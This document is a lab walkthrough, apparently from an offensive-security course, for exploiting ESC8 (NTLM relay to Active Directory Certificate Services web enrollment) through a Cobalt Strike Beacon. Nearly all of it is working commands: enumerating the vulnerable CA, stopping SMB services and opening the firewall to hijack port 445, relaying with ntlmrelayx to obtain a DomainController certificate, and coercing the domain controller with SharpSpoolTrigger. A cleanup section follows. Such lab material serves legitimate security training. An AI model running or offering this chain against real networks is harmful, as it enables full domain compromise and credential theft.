# ESC8 NTLM Relay to ADCS HTTP Endpoints

>The objective of this lab is to identify and exploit ESC8.

===

## Enumeration

1. Launch Cobalt Strike and connect to the team server.
2. Enumerate the certificate authority for vulnerabilities.

    ```Beacon-nocolor
    execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-cas --filter-vulnerable --hide-admins --quiet
    ```

⚠️ This will show that *lon-cs-1* is vulnerable to ESC8.

===

## Relay Setup

1. Use Beacon to start a SOCKS proxy.
    1. `socks 1080 socks5`
    
2. Run `netstat` to see that port 445 is currently bound.

3. Set the *lanmanserver* service's start mode to *disabled* to prevent it from automatically restarting.

    ```Beacon-nocolor
    sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 4
    ```

4. Stop these services in the following order to unbind port 445.
    1. `sc_stop lanmanserver`
    2. `sc_stop srv2`
    3. `sc_stop srvnet`

⚠️ Run `netstat` and verify that 445 is no longer bound.

5. Start a reverse port forward that will bind to port 445 and redirect the traffic to *127.0.0.1:7445* on the attacker desktop.
	1. `rportfwd_local 445 localhost 7445`

⚠️ `netstat` will show 445 being bound again, but the PID will be that of the Beacon.

6. Port 445 is not always allowed inbound on the Windows firewall, particularly for Workstation.  Add the rule:

    ```Beacon-nocolor
    powerpick New-NetFirewallRule -DisplayName "File Sharing" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 445
    ```

===

## Relaying

1. On the Attacker Desktop, open a Command Prompt and run the Kali Docker container.
    1. `docker container start -i kali-1`

2. Configure proxychains to use Cobalt's SOCKS proxy.
    1. Open `/etc/proxychains.conf` in vim or nano.
    2. Scroll to the last line.
    3. Replace the default socks4 entry with `socks5 10.0.0.5 1080`
    4. Save the changes.

3. Use ntlmrelayx and proxychains to relay incoming authentication requests to the ADCS HTTP endpoint.  We're going to relay the credentials of a domain controller, so we'll specifically request a *DomainController* certificate.

    ```Beacon-nocolor
    proxychains impacket-ntlmrelayx -t http://10.10.120.5/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
    ```

4. While that is waiting, go back to Beacon.
5. Coerce the domain controller into authenticating to the current machine.

    ```Beacon-nocolor
    execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.120.1 10.10.121.108
    ```

⚠️ The reverse port forward will tunnel the request down to ntlmrelayx, which should spring to life and relay up through the SOCKS proxy.  A file called **LON-DC-1.pfx** should be created.

6. Press Ctrl+C to stop ntlmrelayx.

===

## Cleanup

1. Stop the SOCKS proxy.
    1. `socks stop`

2. Stop the reverse port forward.
    1. `rportfwd stop 445`

3. Restore the services back to default.

    ```Beacon-nocolor
    sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 2
    ```

    1. `sc_start srvnet`
    2. `sc_start srv2`
    3. `sc_start lanmanserver`

4. Remove the firewall rule.

    ```Beacon-nocolor
    powerpick Remove-NetFirewallRule -DisplayName "File Sharing"
    ```

⚠️ This lab, you have learned how to identify and exploit ESC8 through a C2.
